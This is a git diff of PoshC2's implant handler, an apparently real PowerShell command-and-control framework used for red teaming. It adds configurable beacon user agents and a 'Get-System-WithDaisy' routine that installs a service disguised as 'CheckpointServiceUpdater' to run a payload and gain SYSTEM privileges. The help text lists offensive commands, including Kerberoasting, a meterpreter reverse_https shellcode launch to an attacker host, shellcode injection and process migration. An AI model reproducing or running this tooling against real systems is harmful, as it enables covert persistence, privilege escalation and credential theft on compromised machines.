@@ -45,6 +45,7 @@ function Implant-Handler
     $ipv4address = $c2serverresults.HostnameIP
     $serverport = $c2serverresults.ServerPort
     $URLS =  $c2serverresults.URLS
+    $useragent =  $c2serverresults.UserAgent
     $Host.ui.RawUI.WindowTitle = "PoshC2 Implant Handler: $ipv4address Port $serverport"
         
 $head = '
@@ -116,7 +117,7 @@ $header = '
             Write-Host -Object "|   |  Y Y  \  |_> >  |__/ __ \|   |  \  |  \___ \ " -ForegroundColor Green
             Write-Host -Object "|___|__|_|  /   __/|____(____  /___|  /__| /____  >" -ForegroundColor Green
             Write-Host -Object "          \/|__|             \/     \/          \/ " -ForegroundColor Green
-            Write-Host "============== v2.13 www.PoshC2.co.uk =============" -ForegroundColor Green
+            Write-Host "============== v2.14 www.PoshC2.co.uk =============" -ForegroundColor Green
             Write-Host "===================================================" `n -ForegroundColor Green
 
             foreach ($implant in $dbresults) 
@@ -459,7 +460,8 @@ $header = '
         write-host " Get-ComputerInfo"-ForegroundColor Green 
         write-host " Unzip <source file> <destination folder>"-ForegroundColor Green 
         write-host " Get-System" -ForegroundColor Green
-        write-host " Get-System-WithProxy" -ForegroundColor Green 
+        write-host " Get-System-WithProxy" -ForegroundColor Green
+        write-host " Get-System-WithDaisy" -ForegroundColor Green 
         write-host " Get-ImplantWorkingDirectory"-ForegroundColor Green
         write-host " Get-Pid" -ForegroundColor Green 
         write-host " Get-Webpage http://intranet" -ForegroundColor Green 
@@ -547,7 +549,7 @@ $header = '
         write-host " Get-NetDomainController | Select name | get-netsession | select *username,*CName" -ForegroundColor Green
         write-host " Get-DFSshare | get-netsession | Select *username,*CName" -ForegroundColor Green
         write-host " Get-NetFileServer | get-netsession | Select *username,*CName" -ForegroundColor Green
-        write-host " Invoke-Kerberoast -AdminCount -OutputFormat HashCat|Select-Object -ExpandProperty hash" -ForegroundColor Green
+        write-host " Invoke-Kerberoast -OutputFormat HashCat|Select-Object -ExpandProperty hash" -ForegroundColor Green
         write-host " Write-SCFFile -IPaddress 127.0.0.1 -Location \\localhost\c$\temp\" -ForegroundColor Green
         write-host " Write-INIFile -IPaddress 127.0.0.1 -Location \\localhost\c$\temp\" -ForegroundColor Green
         write-host ' Get-NetGroup | Select-String -pattern "Internet" ' -ForegroundColor Green
@@ -564,7 +566,7 @@ $header = '
         Write-Host " Get-Inveigh | Stop-Inveigh (Gets Output from Inveigh Thread)" -ForegroundColor Green
         Write-Host " Invoke-Sniffer -OutputFile C:\Temp\Output.txt -MaxSize 50MB -LocalIP 10.10.10.10" -ForegroundColor Green
         Write-Host " Invoke-SqlQuery -sqlServer 10.0.0.1 -User sa -Pass sa -Query 'SELECT @@VERSION'" -ForegroundColor Green
-        Write-Host " Invoke-Runas -User SomeAccount -Password SomePass -Domain SomeDomain -Binary C:\Windows\System32\cmd.exe -Args <optional> -LogonType 0x2" -ForegroundColor Green        
+        Write-Host " Invoke-Runas -User SomeAccount -Password SomePass -Domain SomeDomain -Command C:\Windows\System32\cmd.exe -Args `" /c calc.exe`"" -ForegroundColor Green        
         write-host " Invoke-DCOMPayload -Target <ip>" -ForegroundColor Green
         write-host " Invoke-DCOMProxyPayload -Target <ip>" -ForegroundColor Green
         write-host " Invoke-DCOMDaisyPayload -Target <ip>" -ForegroundColor Green
@@ -612,13 +614,13 @@ $header = '
         write-host " Migrate" -ForegroundColor Green
         write-host " Migrate -ProcID 444" -ForegroundColor Green
         write-host " Migrate -ProcessPath C:\Windows\System32\cmd.exe" -ForegroundColor Green
-        write-host " Migrate-x64 -ProcID 4444" -ForegroundColor Green
-        write-host " Migrate-x64 -ProcessPath C:\Windows\System32\cmd.exe" -ForegroundColor Green
-        write-host " Migrate-x86 -ProcessPath C:\Windows\System32\cmd.exe" -ForegroundColor Green
-        write-host " Migrate-Proxy-x86 -ProcID 4444" -ForegroundColor Green
-        write-host " Migrate-Proxy-x64 -ProcID 444" -ForegroundColor Green
-        write-host " Migrate-Daisy-x86 -Name DC1  -ProcID 444" -ForegroundColor Green
-        write-host " Migrate-Daisy-x64 -Name DC2" -ForegroundColor Green
+        #write-host " Migrate-x64 -ProcID 4444" -ForegroundColor Green
+        #write-host " Migrate-x64 -ProcessPath C:\Windows\System32\cmd.exe" -ForegroundColor Green
+        #write-host " Migrate-x86 -ProcessPath C:\Windows\System32\cmd.exe" -ForegroundColor Green
+        #write-host " Migrate-Proxy-x86 -ProcID 4444" -ForegroundColor Green
+        #write-host " Migrate-Proxy-x64 -ProcID 444" -ForegroundColor Green
+        #write-host " Migrate-Daisy-x86 -Name DC1  -ProcID 444" -ForegroundColor Green
+        #write-host " Migrate-Daisy-x64 -Name DC2" -ForegroundColor Green
         write-host " Inject-Shellcode -x86 -Shellcode (GC C:\Temp\Shellcode.bin -Encoding byte) -ProcID 5634" -ForegroundColor Green
         write-host " Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 172.16.0.100 -Lport 443 -Force" -ForegroundColor Green
         write-host ' Get-Eventlog -newest 10000 -instanceid 4624 -logname security | select message -ExpandProperty message | select-string -pattern "user1|user2|user3"' -ForegroundColor Green
@@ -641,7 +643,7 @@ $wc.UseDefaultCredentials = $true;
 $wc.Proxy.Credentials = $wc.Credentials;
 $h="'+$domainfrontheader+'"
 if ($h) {$wc.Headers.Add("Host",$h)}
-$wc.Headers.Add("User-Agent","Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0)")
+$wc.Headers.Add("User-Agent","'+$useragent+'")
 if ($cookie) {
 $wc.Headers.Add([System.Net.HttpRequestHeader]::Cookie, "SessionID=$Cookie")
 } $wc }
@@ -771,7 +773,7 @@ if (`$k -lt `$d) {exit}
 `$password = `$password
 `$proxyurl = `$proxyurl
 `$wc = New-Object System.Net.WebClient;  
-`$wc.Headers.Add("User-Agent","Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0)")
+`$wc.Headers.Add("User-Agent","'+$useragent+'")
 `$h=`$domainfrontheader
 if (`$h) {`$wc.Headers.Add("Host",`$h)}
 if (`$proxyurl) {
@@ -892,6 +894,7 @@ if (!`$t) {
         `$Job.RunspacePool = `$RunspacePool
         `$Job.BeginInvoke() | Out-Null 
     }
+    echo "To stop the Daisy Server, kill current process"
 }
 
 "@
@@ -1365,7 +1368,7 @@ param
                 }
             }
             if ($pscommand.ToLower().StartsWith('invoke-dcomdaisypayload'))
-            {
+            {     
                 $pscommand = IEX $pscommand
             }
             if ($pscommand.ToLower().StartsWith('invoke-dcompayload'))
@@ -2001,7 +2004,34 @@ param
                     write-host "Need to run CreateProxyPayload first"
                     $pscommand = $null
                 }
-            }                   
+            } 
+            if ($pscommand -eq 'Get-System-WithDaisy') 
+            {
+                $name = Read-Host "Name"
+                if (Test-Path "$FolderPath\payloads\$($name).bat"){
+                    $payload = Get-Content -Path "$FolderPath\payloads\$($name).bat"
+
+                    $query = "INSERT INTO NewTasks (RandomURI, Command)
+                    VALUES (@RandomURI, @Command)"
+
+                    Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
+                        RandomURI = $psrandomuri
+                        Command   = "sc.exe create CPUpdater binpath= 'cmd /c "+$payload+"' Displayname= CheckpointServiceUpdater start= auto"
+                    } | Out-Null
+
+                    $query = "INSERT INTO NewTasks (RandomURI, Command)
+                    VALUES (@RandomURI, @Command)"
+
+                    Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
+                        RandomURI = $psrandomuri
+                        Command   = "sc.exe start CPUpdater"
+                    } | Out-Null
+                    $pscommand = "sc.exe delete CPUpdater"
+                } else {
+                    write-host "Need to run Invoke-DaisyChain first"
+                    $pscommand = $null
+                }
+            }                     
             if ($pscommand -eq 'Hide-Implant') 
             {
                 $pscommand = "Hide"
